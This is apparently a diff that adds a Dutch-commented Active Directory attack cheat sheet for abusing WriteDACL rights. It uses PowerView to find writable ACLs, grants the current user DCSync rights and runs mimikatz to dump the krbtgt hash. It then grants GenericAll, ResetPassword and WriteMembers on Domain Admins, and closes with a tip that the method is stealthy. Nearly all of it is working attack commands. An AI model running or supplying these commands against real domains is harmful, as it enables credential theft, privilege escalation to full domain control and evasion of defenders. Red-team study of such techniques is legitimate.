@@ -1,0 +1,15 @@
+# WriteDACL Abuse - ACL van object wijzigen
+# Stap 1: Vind objecten waar je WriteDACL op hebt
+powershell -c "Import-Module .\PowerView.ps1; Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'WriteDacl' -and $_.IdentityReferenceName -match 'currentuser'}"
+# === DCSync rechten toekennen (op domain object) ===
+Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity currentuser -Rights DCSync -Verbose
+# Daarna DCSync uitvoeren:
+mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt" exit
+# === GenericAll rechten toekennen (op user/groep) ===
+Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity currentuser -Rights All -Verbose
+# === Specifieke rechten toekennen ===
+# ResetPassword:
+Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity currentuser -Rights ResetPassword -Verbose
+# WriteMembers (op groep):
+Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity currentuser -Rights WriteMembers -Verbose
+# Tip: WriteDACL is stealth - je wijzigt alleen de ACL, niet het object zelf
